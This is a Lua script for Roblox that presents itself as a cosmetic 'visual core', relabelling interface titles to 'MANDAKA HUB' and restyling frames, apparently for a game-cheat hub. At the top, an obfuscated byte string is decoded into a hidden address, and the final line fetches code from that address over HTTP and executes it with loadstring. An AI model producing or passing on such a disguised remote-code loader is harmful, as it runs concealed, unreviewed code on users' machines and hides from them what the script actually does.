
--[[ STAGE 2: VISUAL CORE ]]
local sIdoOQszj_f2tJ="\065\082\095\088\096\180\174\171\115\111\002\070\004\003\019\020\038\016\040\043\034\060\042\059\199\202\192\214\217\024\210\227\238\053\241\255\251\243\140\129\150\143\153\163\153\233\161\190\178\177\070\087\070\086\083\155\102\095\108\118\188\087\098\108\120\109\120\113\020\012\032\050\034\050\198\055\040\201\220\222\212\211\210\052\054\060\245\198\204\132\129\214\145\167\144"local pwgFflWX15Me6bIfwZv3kB=196 local GscWfSK2WZ3ZjTrDz1Pk85=16 local I7LhudWMlQv8zCp=1 local MkYdcL7abDMC=5 local HWJjpigbUGa9h4nE1y=8 local HTt4shfCYsA0ctY1W3f=false local NYDQtkymGwVk=bit32 and bit32.bxor if not NYDQtkymGwVk then NYDQtkymGwVk=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Z9Tj6ZrdXtBjb1T7={}for y9aZIOmOjV4ldNHlXdRlex=1,#sIdoOQszj_f2tJ do local pQCcvZoilRvOpEIrbR0XPC=string.byte(sIdoOQszj_f2tJ,y9aZIOmOjV4ldNHlXdRlex)local qFNaHeNYI55xUsT2W=(GscWfSK2WZ3ZjTrDz1Pk85+(y9aZIOmOjV4ldNHlXdRlex*MkYdcL7abDMC)+HWJjpigbUGa9h4nE1y)%256 if I7LhudWMlQv8zCp==0 then pQCcvZoilRvOpEIrbR0XPC=(pQCcvZoilRvOpEIrbR0XPC-qFNaHeNYI55xUsT2W)%256 Z9Tj6ZrdXtBjb1T7[y9aZIOmOjV4ldNHlXdRlex]=string.char(NYDQtkymGwVk(pQCcvZoilRvOpEIrbR0XPC,pwgFflWX15Me6bIfwZv3kB))else pQCcvZoilRvOpEIrbR0XPC=NYDQtkymGwVk(pQCcvZoilRvOpEIrbR0XPC,pwgFflWX15Me6bIfwZv3kB)Z9Tj6ZrdXtBjb1T7[y9aZIOmOjV4ldNHlXdRlex]=string.char((pQCcvZoilRvOpEIrbR0XPC-qFNaHeNYI55xUsT2W)%256)end end local MU6qlhpWmgTdUwOR=table.concat(Z9Tj6ZrdXtBjb1T7)if HTt4shfCYsA0ctY1W3f then MU6qlhpWmgTdUwOR=string.reverse(MU6qlhpWmgTdUwOR)end local eM5AatoTfNqsKYdV=MU6qlhpWmgTdUwOR
local HubName = "MANDAKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(eM5AatoTfNqsKYdV))()
